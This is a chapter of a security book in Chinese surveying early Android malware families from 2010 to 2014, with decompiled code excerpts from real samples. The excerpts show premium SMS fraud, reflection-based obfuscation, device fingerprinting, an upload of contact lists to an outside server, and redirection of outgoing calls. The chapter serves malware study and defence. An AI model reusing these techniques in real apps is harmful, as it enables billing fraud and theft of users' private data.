# 第二章：安卓恶意软件的现状**

![图片](img/common.jpg)

本章概述了自 2010 年以来在野外发现的有趣安卓恶意软件样本，当时首次发现了这些样本。正如你将很快看到的那样，恶意软件作者不断寻求更有利可图的方式来滥用安卓设备，导致了许多恶意软件家族的兴衰。

市面上有数百万个安卓恶意软件样本，本章无法涵盖所有样本。我们选择主要集中于一些著名的恶意软件家族，这些家族的应用数量较大，可能是由大规模恶意企业设计的。这些企业通常在某种程度上很有趣，无论是技术能力还是运营能力。我们还重点介绍了一些在其他出版物中没有讨论过的恶意软件家族。即使是安卓安全团队的常规读者，也应该能在这里发现新信息。对于每个恶意软件家族，我们讨论其技术特性、其有趣的特点以及其在安卓恶意软件历史中的地位。

**注意**

*我们通过其包名、版本号以及恶意软件文件 SHA-256 哈希值的前四位来引用恶意软件样本，格式如下：* com.batterypro *(v4, 29ee)。通过这些信息，你应该能够在自己的恶意软件文件数据库中找到相应的恶意软件样本。*

### **初期阶段：2008 到 2012 年**

黑客们很快就发现了安卓。该平台于 2008 年推出，而在此之前，犯罪恶意软件企业已经开始滥用其他操作系统。18 个月后，安卓迅速占领市场，吸引了恶意软件作者的注意，2010 年，第一个安卓恶意软件样本出现在 Google Play（当时称为安卓市场）。

直到今天，几乎所有已知的安卓恶意软件都旨在通过非法手段赚钱。与 DOS、Windows 和 Linux 恶意软件的历史相比，后者在几十年的技术创新后，才将盈利作为恶意软件作者的主要动机。相比之下，安卓恶意软件主要的研究价值在于探索智能手机能够以规模化方式赚取金钱的新方式，这些方式在桌面系统上是无法实现的。

在首次发生高调的恶意软件事件后，Android 安全团队制定了一个计划，以保持 Google Play 免受恶意软件的侵害。为了躲避新的防御，恶意软件作者采用了一些策略：继续开发恶意软件并发布到 Google Play，这需要投入绕过 Google Play 恶意软件扫描的技术；开发通过第三方网站和应用商店（称为侧载）分发的恶意软件，这需要投入吸引用户的营销方法；以及开发预安装在设备上的恶意软件，这需要投入社交工程和策略，例如设立虚假的商业前台，欺骗设备制造商在其设备中预装恶意软件作为生产过程的一部分。本章详细介绍了通过这些方式分发的恶意软件。

#### ***DroidSMS***

2010 年 8 月，俄罗斯安全公司卡巴斯基发现了 Google Play 外的恶意软件。这个恶意软件被称为 DroidSMS，并在一篇名为《Android 首个短信木马》的博客文章中进行了描述，它通常被认为是第一个 Android 恶意软件家族。

DroidSMS 被用来从用户设备发送昂贵的短信到诈骗者之前注册的高级短信号码。当用户安装并运行 DroidSMS 时，应用会在用户没有察觉的情况下发送一条隐藏的短信。用户随后会被收取一小笔费用，这笔费用将支付给恶意软件作者。受影响的用户只有在下次收到手机账单时才会得知这一非法收费，前提是他们关心并检查账单中的无法解释的费用。

所有这些秘密短信活动都发生在 Android 平台安全模型的范围内。特别是，Android 的权限系统按照设计工作，显示一个对话框询问用户是否允许 DroidSMS 发送短信。当时，Android 经常让用户做出与安全相关的决定。毕竟，Android 是一个开放系统，普遍的观点认为，用户应该做出自己的安全和隐私选择；Android 和 Google Play 只是提供用户做出这些决策所需的信息。然而，滥用许多用户缺乏安全意识的应用很快开始出现在 Google Play 上。

回顾过去，将安全和隐私决策交给用户的想法，在只有技术爱好者使用 Android 的时代可能看起来是合理的。但是，一旦 Android 开始获得广泛的吸引力，这一系统就出现了问题。指望数十亿普通用户理解 Android 权限系统的复杂性是不理性的。Android 团队最终意识到这一点，并对 Android 进行了许多“默认安全”技术的改进，这些技术现在能够保护用户免受像 DroidSMS 这样直接的滥用。

#### ***DroidDream***

DroidSMS 出现几个月后，Android 恶意软件的形势急剧恶化。2011 年 3 月，总部位于旧金山的安全公司 Lookout Mobile Security 在 Google Play 上发现了一种新型木马，命名为 DroidDream。正如 Lookout 博客文章《安全警报：在官方 Android 市场中发现 DroidDream 恶意软件》所描述，DroidDream 比以往的 Android 恶意软件更为严重，因为它突破了 Android 安全模型的边界。DroidDream 利用了一个名为 Rage Against the Cage（也称为 CVE-2010-EASY）的特权升级漏洞，通过该漏洞，DroidDream 利用 Android 操作系统中的漏洞获得了 root 权限。

DroidDream 是 Android 安全团队的一个转折点。由于受影响的设备已经被永久性地入侵，用户无法将其重置为安全状态，因此 Google Play 应用必须在用户使用之前进行安全扫描。Android 安全团队迅速宣布，他们将从设备中删除现有的 DroidDream 安装，这至少能拯救那些已经安装但尚未打开被感染应用的用户。

以前没有尝试过远程删除应用程序，而从设备中删除 DroidDream 依赖于 Google Play 应用内置的黑客技术。由于远程删除的明显价值，Android 安全团队将其作为一个官方功能添加到了 Google Play Protect 中。如今，Android 安全团队定期通过远程删除高风险类别（如银行钓鱼或勒索病毒）和类似 DroidDream 的 root 木马恶意软件，来保护 Android 用户。

#### ***壁纸家族***

这个来自 Android 初期的大型短信欺诈恶意软件家族假装提供主屏幕壁纸供下载。尽管它的规模很大，但这个恶意软件家族至今未被公开描述。

与所有早期 Android 恶意软件一样，它没有对分析进行保护。它的应用程序在执行恶意 payload 时没有采用任何混淆或其他技术来迷惑安全研究人员。例如，清单 2-1 显示了 *com.kk4.SkypeWallpapers* (v3, 8cab) 中的短信欺诈功能。该应用程序检查是否运行在俄罗斯的手机上，如果是，它会执行 `makeRelation` 方法来发送未公开的高级短信。

```
private void makeRelation(
    String phoneNumber, String message, Context context) {
  int v3_0 = 0;

  AlertDialog.Builder v6_1 = AlertDialog.Builder(this);
  v6_1.setMessage("You don't have enough permissions");
  v6_1.setCancelable(0);
  v6_1.setNeutralButton("OK",
    new com.kk4.SkypeWallpapers.AlertActivity$5(this));

  PendingIntent v4_0 = PendingIntent.getBroadcast(
    this, v3_0, new Intent("SMS_SENT"), v3_0);

  PendingIntent v5_0 = PendingIntent.getBroadcast(
    this, v3_0, new Intent("SMS_DELIVERED"), v3_0);

  this.registerReceiver(
    new com.kk4.SkypeWallpapers.AlertActivity$6(this, v6_1),
    new IntentFilter("SMS_SENT"));

  SmsManager.getDefault().sendTextMessage(
    phoneNumber, 0, message, v4_0, v5_0);
}
```

*清单 2-1：* com.kk4.SkypeWallpapers *(v3, 8cab) 中的高级短信欺诈功能*

`makeRelation` 这个方法名称是这个家族的特征。具有访问 Android 恶意软件数据库的读者可以搜索该方法，发现更多样本。

#### ***相机家族***

这个大型的短信欺诈恶意软件家族没有名称，也没有公开的文档。它通常伪装成相机应用或其他系统工具，于 2011 年中期活跃起来，并且比壁纸家族更为复杂。

与仅仅针对俄罗斯用户不同，这种恶意软件家族收集了设备的国家和移动运营商信息，将其发送到指挥与控制服务器，并接收要发送的电话号码和短信内容。这个技术使其能够在不同的国家运行并扩展到新的国家，而无需更新应用程序。列表 2-2 来自*com.batterypro*（v4，29ee），展示了如何收集这些设备配置文件数据。

```
if (this.prefsWrapper.isFirstRun()) {
  this.params.put("pid", this.getString(2131034134));
  this.params.put("pin", String.valueOf(this.utils.getPin()));
  this.params.put("carrier",
    this.telephonyInfo.getTelephonyNetworkOperatorName().replaceAll("\n", ""));
  this.params.put("imei", this.telephonyInfo.getTelephonyIMEI());
  this.params.put("market", "1");
  this.params.put("cc",
    this.telephonyInfo.getTelephonyNetworkOperator());
  this.params.put("appurl", this.getString(2131034135));
}
```

*列表 2-2：* com.batterypro *(v4，29ee) 应用收集设备信息，稍后用于定制短信欺诈。*

无论是良性应用还是恶意应用，通常都会记录这个应用收集的数据点，比如设备的国际移动设备身份码（IMEI）。由于 IMEI 号码是全球唯一的标识符，它们可以用于对设备进行指纹识别，识别单个用户，并将其他收集的数据与特定设备关联起来。

为了遏制 IMEI 在用户追踪中的滥用，Android 10 开始通过使用一种名为`READ_PRIVILEGED_PHONE_STATE`的特殊权限来保护对 IMEI 和其他类似硬件标识符的访问。这个权限对 Google Play 上的应用程序不可用。想要访问这些硬件标识符的应用程序必须寻找其他分发机会。

#### ***Cricketland***

虽然短信欺诈在 2012 年占据了大约 20%的安卓恶意软件，并获得了最多的公众关注，但移动电话上敏感数据的可用性也催生了间谍软件。事实上，间谍软件在 Google Play 初期是最常见的恶意软件类别——在早期的间谍软件家族中，Cricketland 是最大的。

直到现在，Cricketland 一直没有公开文档，它是一个嵌入在看似合法的越南应用程序中的 SDK。目前尚不清楚使用这个 SDK 的应用开发者是否知道它的间谍软件功能。在未经用户同意的情况下，这个 SDK 会将用户的联系人列表信息发送到远程服务器。Android 安全团队将其命名为 Cricketland，源于 SDK 包名*net.cricketland*。

Cricketland 的代码并不复杂。当一个包含 Cricketland 的应用初始化 SDK 时，它会收集各种信息并上传到一个托管在 Google Drive 上的页面上。使用 Cricketland SDK 的一个应用示例是*masteryourgames.amazingalextoolbox*（v12，c4f0）。它的数据收集代码见列表 2-3。

```
net.cricketland.android.lib.report.CReportField[] v0_4 =
  new net.cricketland.android.lib.report.CReportField[17];
v0_4[0] = net.cricketland.android.lib.report.CReportField.DEVICE_ID;
v0_4[1] = net.cricketland.android.lib.report.CReportField.UUID;
v0_4[2] = net.cricketland.android.lib.report.CReportField.PACKAGE_NAME;
v0_4[3] = net.cricketland.android.lib.report.CReportField.VERSION_CODE;
v0_4[4] = net.cricketland.android.lib.report.CReportField.IP;
v0_4[5] = net.cricketland.android.lib.report.CReportField.PHONE;
v0_4[6] = net.cricketland.android.lib.report.CReportField.ACCOUNTS;
v0_4[7] = net.cricketland.android.lib.report.CReportField.CONTACTS;
v0_4[8] = net.cricketland.android.lib.report.CReportField.LOCALE;
v0_4[9] = net.cricketland.android.lib.report.CReportField.LOCATION;
v0_4[10] = net.cricketland.android.lib.report.CReportField.SDK;
v0_4[11] = net.cricketland.android.lib.report.CReportField.BUILD;
v0_4[12] = net.cricketland.android.lib.report.CReportField.CPU;
v0_4[13] = net.cricketland.android.lib.report.CReportField.MEM;
v0_4[14] = net.cricketland.android.lib.report.CReportField.DISPLAY;
v0_4[15] = net.cricketland.android.lib.report.CReportField.FEATURES;
v0_4[16] = net.cricketland.android.lib.report.CReportField.PACKAGES;
```

*列表 2-3：Cricketland 数据收集代码在* masteryourgames.amazingalextoolbox *（v12，c4f0）中*

Android 安全团队认为，任何未经用户同意收集用户联系人列表的应用程序都可以被视为间谍软件。未经用户同意收集电话位置或账户信息也是有问题的，并且在 Google 的移动不良软件政策中有所涵盖。由于这些账户信息包括设备上注册的所有账户，恶意软件可以利用这些信息将用户的电子邮件地址与其 LinkedIn 档案、X 账号、Facebook 页面等进行关联。

收集账户信息以建立跨平台用户档案的危险显而易见。在 Android 8.0（Oreo）中，Android 团队移除了在未获得用户同意的情况下悄悄收集这些信息的能力。

#### ***Dougaleaker***

另一个值得注意的间谍网络是 Dougaleaker，它在 2012 年针对日本国民的联系人列表信息。该网络由美国安全公司 McAfee 发现，并在一篇名为“Android 恶意软件承诺视频同时窃取联系人”的博客文章中进行了描述。

日本警方最终逮捕了 Dougaleaker 的作者，并以间谍软件分发罪进行审判，但日本法院判定他们无罪。关于此案件的英文媒体报道较少，但《The Register》发布的文章《5 名东京开发者因‘电影’Android 应用骗局被捕》提供了一些背景。

当用户启动 Dougaleaker 应用时，例如*jp.co.dougastation*（v2, 83fd），间谍软件功能会将其联系人列表信息发送到一个 Web 服务器（列表 2-4）。

```
String v1_0 = jp.co.dougastation.util.PhoneUtil.getPref(this, "ALREADY_GET");
if ((jp.co.dougastation.util.StringUtil.isEmpty(v1_0)) || (!v1_0.equals("true"))) {
  String[] v3_5 = new String[2];
  v3_5[0] = "http://i-hug.net";
  v3_5[1] = "/appli/addressBookRegist";
  String v2_0 = jp.co.dougastation.util.StringUtil.addString(v3_5);
  java.util.ArrayList v0_1 = new java.util.ArrayList();
  v0_1.add(new BasicNameValuePair("telNo", 
    jp.co.dougastation.util.PhoneUtil.getTelNo(this)));
  v0_1.add(new BasicNameValuePair("individualNo", 
    jp.co.dougastation.util.PhoneUtil.getIndividualNo(this)));
  v0_1.add(new BasicNameValuePair("simSerialNo", 
    jp.co.dougastation.util.PhoneUtil.getSimSerialNo(this)));
  v0_1.add(new BasicNameValuePair("appliId", "4"));
  if (4 >= jp.co.dougastation.util.PhoneUtil.getSdkVersion()) {
    v0_1.add(new BasicNameValuePair("addressBook", this.getMailUnder4()));
  } else {
    v0_1.add(new BasicNameValuePair("addressBook", 
      jp.co.dougastation.util.AddressBookUtil.getAddressBookOver4(
        this.getContentResolver())));
  }
  jp.co.dougastation.util.HttpUtil.doPost(v2_0, v0_1);
```

*列表 2-4：Dougaleaker 间谍软件代码在* jp.co.dougastation *(v2, 83fd)中*

Dougaleaker 的间谍软件功能有限且目标狭窄，这表明它的创作者仅有一个目的：绘制所有日本人的社交关系图。由于该应用的安装量非常高，作者们很可能在他们的目标上取得了成功。

#### ***BeeKeeper***

BeeKeeper 是另一个之前未被描述的大规模 SMS 欺诈家族，目标是俄罗斯的 Android 用户。为了获得安装量，恶意软件应用伪装成流行品牌。Android 安全团队将这个家族命名为 BeeKeeper，因为它主要针对俄罗斯 Beeline 移动运营商网络上的手机。

在技术层面，BeeKeeper 有两个有趣的地方。首先，它使用了一种强大的指挥和控制结构：支持十多个命令，命令名如`sendContactList`、`sendSms`、`catchSms`和`openUrl`。服务器控制 BeeKeeper 在设备上执行的每一个动作。

其次，BeeKeeper 使用反射作为一种混淆技术，来隐藏其行为，以防止静态分析。*反射*是 Java 的一项特性，允许开发人员检查、修改或调用程序中的类、对象和方法。反射的使用引入了一种间接性，使得静态应用分析变得困难。特别是，它允许代码通过混淆、编码和加密的字符串引用类和方法。

列表 2-5 展示了 BeeKeeper 如何使用反射动态解析 Android API 方法`SmsManager.sendTextMessage`，然后利用该方法发送短信。

```
public static boolean sendSms(String number, String text) {
  boolean v5_0 = true;
  try {
    Class v3_0 = Class.forName("android.telephony.SmsManager");
    Object v4_0 = v3_0.getMethod("getDefault",
      new Class[0]).invoke(0, new Object[0]);
    Class[] v8_5 = new Class[5];
    v8_5[0] = Class.forName("java.lang.String");
    v8_5[1] = Class.forName("java.lang.String");
    v8_5[2] = Class.forName("java.lang.String");
    v8_5[3] = Class.forName("android.app.PendingIntent");
    v8_5[4] = Class.forName("android.app.PendingIntent");
    reflect.Method v2_0 = v3_0.getMethod("sendTextMessage", v8_5);
    Object[] v7_5 = new Object[5];
    v7_5[0] = number;
    v7_5[1] = 0;
    v7_5[2] = text;
    v7_5[3] = 0;
    v7_5[4] = 0;
    v2_0.invoke(v4_0, v7_5);
  } catch (Exception v0_0) {
    v0_0.printStackTrace();
    v5_0 = false;
  }
  return v5_0;
}
```

*列表 2-5：应用* com.qiwi.application *(v4, 37f3)伪装成数字钱包服务 Qiwi，并使用反射来隐藏静态分析。*

首先，恶意软件创建了一个 Android `SmsManager` 类的对象，该对象具备发送短信的能力。然后，它查找带有五个 `String` 和 `PendingIntent` 参数的 `sendTextMessage` 方法。最后，它调用 `sendTextMessage` API，将费用较高的短信发送到指定的电话号码。

直到今天，反射仍然是规避恶意软件分析和检测的常用技术之一。通常，基于反射的混淆不像 BeeKeeper 的情况那样容易理解，因为现代 Android 恶意软件通常会加密和混淆传递给反射 API 的字符串参数。一些恶意软件分析工具无法处理这种加密与反射相结合的情况，因此无法有效分析现代 Android 恶意软件。

在一些极端情况下，传递给反射 API 的参数根本不会出现在代码中。我们曾看到这些参数从应用的资产文件或甚至是互联网加载。

#### ***Dogowar***

转到轻松一点的内容，接下来我们将介绍一个并非为了盈利而创建的 Android 恶意软件样本。Android.Dogowar，首次由美国安全公司 Symantec 在 2011 年 8 月的博客文章《动物权利抗议者通过移动手段传达信息》中描述，修改了一款合法但具有争议的游戏 *Dog Wars*，并添加了两个功能。首先，它向设备联系人列表中的所有联系人发送了短信：“我喜欢伤害小动物，只是想让你知道这一点。”其次，它向收费号码 73822 发送了一条短信，订阅了一个由“美国动物保护协会”（PETA）提供的关于动物福利的新闻服务。显然，恶意软件开发者对这款模拟狗斗游戏和所有参与其中的玩家感到不满。

#### ***其他早期的 Android 恶意软件***

其他早期在 Google Play 上发现的恶意软件示例包括 Plankton、DroidKungFu、ggTracker、DroidDream Light 和 Gingermaster。由于安全研究人员已对这些恶意软件进行了详尽的描述，因此我们在此不再赘述。你可以通过快速的网络搜索找到更多相关信息。

早期的 sideloaded 和预装恶意软件的重建更为困难。那时，Android 安全团队和外部安全研究人员主要关注 Google Play，因此描述其他恶意软件的 2011 年和 2012 年的数据零星且难以获取。安全团队会保留所有 Google Play 应用的历史日志，但对于 sideloaded 应用则没有此类日志。根据我们掌握的有限数据，我们认为 DroidDream Light，一款没有包含任何特权提升漏洞的 DroidDream 间谍软件变种，可能是 2011 年最常被 sideload 的恶意软件。2012 年，RuFraud 这一针对俄罗斯的付费短信诈骗恶意软件家族，可能是最流行的 sideloaded 恶意软件。

我们没有发现 2010 到 2012 年间有任何预装恶意软件（即预先安装在 Android 设备上的恶意软件）活跃的记录。然而，我们也怀疑在早期的那些年份里，研究人员可能并未专门寻找预装恶意软件，因此它可能存在，而当时没有人注意到。

### **恶意软件的专业化：2013 年与 2014 年**

2013 年是 Android 恶意软件的历史性一年。之前的恶意软件偶尔会造成严重的损害，有时传播范围较广，但它们很少同时做到这两点。没有任何恶意软件网络在分发、技术和盈利能力上都表现出色。但在 2013 年，几种恶意软件家族的出现改变了这一切，它们的开发者理解如何构建一个成功的恶意软件企业。这些恶意软件开发者可能将自己组织成了适度的软件公司，而不像以往的孤狼式或小规模的操作。

虽然短信欺诈和间谍软件在 2013 年继续占据主导地位（合计它们占 Google Play 上所有恶意软件的 50%以上），但恶意下载程序（占 20%）和 root 木马（占 20%）也同样重要。

#### ***Ghost Push***

在 2013 年，所有出现在 Google Play 上的新型复杂恶意软件家族中，Ghost Push 是规模最大的，几乎负责了那一年所有的 root 木马。它的开发者建立了一个高度扩展、利润丰厚的网络，这个网络由数千个应用程序组成，开发者在随后的几年里不断完善这些应用（并且可能至今仍在更新）。

Android 安全团队自 2014 年就已经知道这个恶意软件家族的存在，但直到 2015 年 9 月，中文安全公司猎豹移动才在一篇中文博客文章中公开描述了它。尽管它的规模庞大，但病毒防护供应商大约用了两年时间才发现这个网络。

Ghost Push 究竟做了什么很难理解。虽然分析其单个文件相对简单，但 Ghost Push 是中国运营的庞大恶意软件分发产业的一部分，任何分析都必须考虑到这个背景。从 2013 年起，这个恶意软件产业生成的 Android 恶意软件数量超过了任何其他来源。据我们了解，这个产业由数量不确定的恶意软件创作者和分发商组成。分发商渗透进 Google Play、第三方应用商店和设备制造商，建立了可靠的恶意软件分发渠道。它们的应用程序使用基于插件的系统来下载恶意模块，这些模块由恶意软件创作者提供。

这种分发方式隐藏了涉及的人员和公司数量。我们曾见过下载超过 20 个具有不同功能的恶意插件的样本。这些插件中有多少是由同一批人开发的？恶意软件分发者和恶意软件创作者是否完全是独立的实体，还是有重叠？这些问题尚无明确答案。我们知道的一件事是，这个行业的焦点完全放在赚钱上，无论是通过广告垃圾邮件、点击欺诈、推动付费应用安装，还是其他方式。

#### ***BadNews、RuFraud 和 RuPlay***

短信欺诈恶意软件在 2013 年继续影响俄罗斯用户。BadNews 是一个在 2013 年 4 月由 Lookout Mobile Security 首次发现的恶意下载者家族，并在一篇名为《BadNews 的传播者》的博客文章中描述。RuPlay 和 RuFraud 组成了一个尚未公开文档化的恶意软件家族网络：RuPlay 应用在 Google Play 上充当恶意下载器，从其他地方下载 RuFraud 应用。

像许多其他恶意软件家族一样，RuPlay 应用模仿了当时流行的应用。RuPlay 的开发者注册了多个域名，如 *[subwaysurfcheats.com](http://subwaysurfcheats.com)* 和 *angrybirds.p.ht*。他们创建了仿制 Google Play 外观的网站，并以虚假借口敦促用户下载应用（例如，获取热门游戏应用如 Subway Surfer 和 Angry Birds 的更新）。他们还利用关键词垃圾邮件和其他恶意手段操控 Google Play 的搜索排名，欺骗用户下载这些冒充应用，而非正版应用。

**注意**

*除了欺骗用户下载真实应用的伪造版本外，Google Play 上的 RuPlay 应用本身并不含有有害功能——短信欺诈功能存在于它们下载并安装的 RuFraud 应用中——因此我们在这里不会展示任何源代码。对于有代表性的示例，感兴趣的读者可以分析* com.wHill ClimbRacingMoneyMod *(v1366388635, 9de8)，它假装提供热门游戏 Hill Climb Racing 的作弊工具。*

RuPlay 短信欺诈应用的最终下载位置是一个名为 *hotdroid-apps.pm* 的网站。这个网站已经消失了，大部分恶意应用也都被历史遗忘了。其中一个幸存的应用是 *flv.app* (v118, 6ed2)，许多杀毒产品将其识别为名为 FakeApp、FakeInst 或 Agent 的恶意软件。该应用为短信欺诈而构建，包含了一些其他有趣的想法。

例如，应用的指挥和控制服务器可以指示应用将用户发出的外呼电话重定向。由于我们无法访问服务器日志，因此不清楚此功能的目的，但很可能该应用试图拦截用户与其移动运营商的电话，以避免因无法识别的收费而产生投诉。用户可能会误打电话给欺诈者，而不是拨打运营商的支持热线。清单 2-6 中的代码展示了这一过程是如何工作的。

```
String v26_0 = intent.getExtras().getString(
  "android.intent.extra.PHONE_NUMBER");
flv.app.Settings.log(new StringBuilder("phone: ").append(v26_0).toString());
if (!flv.app.Settings.isRedirect(v26_0)) {
  return;
} else {
  flv.app.Settings.log("isRedirect: true");
  this.setResultData(0);
  flv.app.Settings.makeCall(context, flv.app.Settings.callTo);
  ...
```

*列表 2-6：该应用* flv.app *(v118, 6ed2) 会重定向用户拨打的电话。*

该应用的命令与控制服务器还支持与文本和通话活动无关的命令。例如，命令`antiUninstall`会触发一个系统对话框，授予该应用设备管理员权限，并从服务器下载一条令人恐惧的消息。多年来，Android 恶意软件使用管理员权限来防止用户卸载恶意应用。随着时间的推移，Android 安全团队与操作系统团队合作，去除恶意软件滥用的设备管理员属性，直到该 API 在 Android 9.0（Pie）中被废弃。在 Android 10 中，API 完全停止了功能。

#### ***WallySMS***

另一个 SMS 欺诈家族 WallySMS 针对的是西欧国家。列表 2-7 是来自 *com.albertech.harlemshake*（v2, 31f8）的样本，它通过检查移动国家代码（MCC）来判断设备是否位于法国、西班牙或德国。然后，它为设备分配一个 Base64 编码的高级短信号码，用于欺诈活动。

```
private static boolean i() { 
  boolean v0_6;
  switch (Integer.parseInt(((TelephonyManager)com.albertech.harlemshake.a.h.
      getSystemService("phone")).getNetworkOperator().substring(0, 3))) { 
    case 208: { 
      com.albertech.harlemshake.a.k = new String(
        Base64.decode("ODE3ODk=", 0), "UTF-8");
      v0_6 = true;
      break;
    }
    case 214: { 
      try { 
        com.albertech.harlemshake.a.k = new String(
          Base64.decode("MjUyMjE=", 0), "UTF-8");
      } catch (UnsupportedEncodingException v0) { 
        v0_6 = false;
      }
    }
    case 262: { 
      com.albertech.harlemshake.a.k = new String(
        Base64.decode("NDY2NDU=", 0), "UTF-8");
    }
    default: { 
      v0_6 = false;
    }
  }

  return v0_6;
}
```

*列表 2-7：该应用* com.albertech.harlemshake *(v2, 31f8) 仅在法国（MCC 208）、西班牙（MCC 214）和德国（MCC 262）具有高级短信有效载荷。*

对该样本的动态分析表明，当在配置为其他国家的设备上执行时，该应用不会显示任何恶意活动。

现代手机有许多不同的配置，因此恶意软件分析工具必须了解它们分析的恶意软件的环境需求。特别是，它们应该结合静态和动态分析的见解，因为在没有静态分析提供的信息的情况下，设置合适的动态分析环境是很棘手的。最先进的恶意软件分析工具会在静态和动态分析引擎之间传递信息。

#### ***Mono WAP***

为了应对早期 Android 系统中 SMS 欺诈的普遍存在，操作系统团队做出了一些改动以更好地保护用户。2012 年，Android 4.2（Jelly Bean）增加了一个警告对话框，每当应用向高级号码发送短信时，都会弹出该对话框。大约在 2014 年，这个 Android 版本达到了关键的分发规模。这个小改动显著减少了 SMS 欺诈的盈利能力，并阻止了通过 Android 进行非法获利的最直接途径。虽然一些 SMS 欺诈家族仍然继续上传到 Google Play，但没有一个变得庞大，也没有得到复杂恶意软件作者的支持。相反，运营专业恶意软件业务的人开始寻找其他方式从 Android 用户身上快速赚钱。

欺诈者实施下一步欺诈的最佳方式是转向其他形式的电话计费欺诈。在许多国家，电话用户可以通过无线应用协议（WAP）计费技术为服务付费。WAP 计费服务器可以通过 HTTP 访问，使恶意应用容易与之连接。欺诈者的缺点是，WAP 计费不像基于短信的计费那样普及，这使得他们只能在少数几个国家（如俄罗斯、泰国、越南、西班牙和英国）实施欺诈。

2014 年最大的 WAP 欺诈家族 Mono WAP 的有趣之处不仅在于其广泛分布，还在于它所选的编程语言以及其恶意代码的极小体积，这使得它很难被发现。

与其他大多数 Android 恶意软件家族（几乎完全使用 Java 编写）不同，Mono WAP 是使用 Mono for Android 编写的，这是一种开源软件框架，允许开发者使用 .NET 语言（如 C#）开发 Android 应用。（2016 年，微软收购了 Mono for Android 背后的公司，并将该框架更名为 Xamarin.Android。）这种语言选择给只能分析 Java 代码的杀毒技术带来了巨大问题。

Mono WAP 欺诈家族的另一个有趣特点是它几乎没有任何代码，并且操作极其隐秘。它在 WebView 中加载 WAP 欺诈页面，WebView 是标准的 Android 组件，用于在没有浏览器的情况下显示网页，并将用户注册为定期订阅的高级服务。在移动运营商加强 WAP 注册保护之前，Mono WAP 应用只需要收集设备的 Android ID 并将其发送到诈骗者托管的域名。

例如，样本 *com.baibla.krasive*（v1，9604）向类似这样的 URL 发出了请求：

```
http://mobifs.ru/?app=krasivejshiemestaplanety\&aid=30016d7eaab21a25
```

`app` 的 URL 参数可能用于标识发出请求的应用，而 `aid` 参数用于标识用户以注册高级服务。

这个简单的方案只适用于连接到提供高级订阅服务的运营商网络的设备。如果设备连接的是 Wi-Fi 或其他运营商的移动网络，则无法进行注册。然而，通过简单的 HTTP 连接注册高级服务的便捷性使得 WAP 欺诈很难被发现。如何区分合法的 HTTP 请求和未经用户同意将用户注册为服务的请求？在 WAP 欺诈应用的早期阶段，通常是在足够多的用户投诉不明收费之后，才发现这些应用。

多年来，移动运营商通过双重身份验证和其他验证用户授权支付的机制来改善防欺诈保护。在一些国家，政府修改了关于 WAP 计费的法律，以便更好地保护消费者。随着移动运营商提高其 WAP 注册页面的安全性，WAP 欺诈应用变得越来越复杂：恶意应用现在需要拦截双重身份验证短信，并使用 JavaScript 或其他技术将确认码输入到对话框中。

WAP 欺诈在安卓系统上持续盈利并广泛存在，直到至少 2023 年。由于合法的 WAP 计费是移动运营商的一项重要收入来源，越来越多的国家和移动运营商开始为其客户启用该服务。每一个新的 WAP 计费市场都会立即吸引 WAP 欺诈恶意软件，因为新的 WAP 计费运营商通常在打击滥用和欺诈方面经验不足。

#### ***加密货币恶意软件***

2014 年也见证了安卓加密货币恶意软件的兴起。那时，用户仍可以利用移动电话有限的硬件规格来挖掘许多加密货币，尤其是当他们控制大量设备并将其转化为挖矿僵尸网络时。起初，隐秘的挖矿行为主要针对比特币和莱特币等加密货币，但很快他们将目标转向了 Monero。由于设计上的原因，挖掘 Monero 比其他当时的加密货币对硬件的要求更低，因此非常适合手机。

Monero 挖矿最大的优势是一个名为 Coinhive 的网站，它允许任何人通过一行 JavaScript 代码来挖掘 Monero 币。很快，世界各地的恶意软件作者（不仅仅是在安卓系统上）将这些 Coinhive 挖矿的一行代码嵌入到应用程序、网站、广告以及任何能执行 JavaScript 代码的地方。由于滥用的规模，杀毒软件和其他安全产品开始屏蔽所有与该网站的连接。2018 年 3 月，计算机安全记者 Brian Krebs 发布了一篇长篇曝光文章，题为“Coinhive 是谁，做了什么？” 该文章详细记录了该网站及其背后人员的可疑历史。Coinhive 在 2019 年初关闭，至此没有其他网站跟随其步伐。这一关闭实际上结束了安卓恶意软件通过隐秘的加密货币挖矿活动。

当加密货币价格在 2020 年和 2021 年飙升至新纪录时，恶意软件作者从挖矿转向了网络钓鱼。钓鱼应用程序入侵了加密货币账户和钱包，并将余额转移到恶意软件开发者的账户中。在成千上万种加密货币通过它们的炒作周期不断变动的复杂加密货币生态系统中保护用户，成为一项真正的挑战。仅仅跟踪这些加密货币的名称、标志、网站以及它们的官方和非官方钱包应用程序，就足以让一个团队全职工作。

#### ***Taicliphot***

在 Google Play 之外，恶意软件的情况依然不透明。我们认为，2012 年到 2014 年间最常被侧载的恶意软件可能是本章前面提到的 RuFraud。成千上万的已知应用样本运行方式相似，但它们是否属于同一恶意软件家族，还是属于具有相同战术的多个家族，仍然不清楚。DroidDream Light 在 2013 年继续活跃，但在 2014 年消失了。

2014 年，另一个重要的市场外恶意软件家族是 Taicliphot 短信诈骗应用，它们主要针对越南的色情内容观众。这些应用几乎没有任何代码，直接跳转到主活动的`onCreate`方法中的短信诈骗功能。清单 2-8 来自 *ncn.taicliphot* (v1, 38a3)，展示了这一功能。

```
protected void onCreate(Bundle savedInstanceState) {
  Type(UNKNOWN) v2_0 = 1024;
  super.onCreate(savedInstanceState);
  this.requestWindowFeature(1);
  this.getWindow().setFlags(v2_0, v2_0);
  this.setContentView(2130903041);
  this.l = ((LinearLayout)this.findViewById(2131034114));
  SmsManager v0_0 = SmsManager.getDefault();
  try {
    if (!this.readFile(this.file).equals("1")) {
      this.writeFile(this.file, "1");
      v0_0.sendTextMessage("6022", 0, "test naenewlife", 0, 0);
      v0_0.sendTextMessage("6022", 0, "test naenewlife", 0, 0);
      v0_0.sendTextMessage("6022", 0, "test naenewlife", 0, 0);
      Log.d("aaaaaaaaaaaaaaaaaaaaa", "Da gui");
    }
  } catch (IOException v6_0) {
    v6_0.printStackTrace();
    try {
      this.writeFile(this.file, "1");
      v0_0.sendTextMessage("8782", 0, "HT androi", 0, 0);
      v0_0.sendTextMessage("8793", 0, "jm2 androi", 0, 0);
      Log.d("aaaaaaaaaaaaaaaa", "Da gui");
    } catch (IOException v7_0) {
      v7_0.printStackTrace();
      this.l.setOnTouchListener(new ncn.taicliphot.xemcliphot$1(this, v0_0));
      return;
    }
  }
```

*清单 2-8：应用* ncn.taicliphot *(v1, 38a3) 在未征得用户同意的情况下发送高级短信。*

